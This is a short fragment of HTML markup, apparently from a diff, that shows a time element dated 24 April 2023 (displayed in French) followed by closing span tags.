+                    <time datetime="2023-04-24 21:14:19 &#43;0200 &#43;0200">24 avril 2023</time>
                   
                 </span>
               </span>
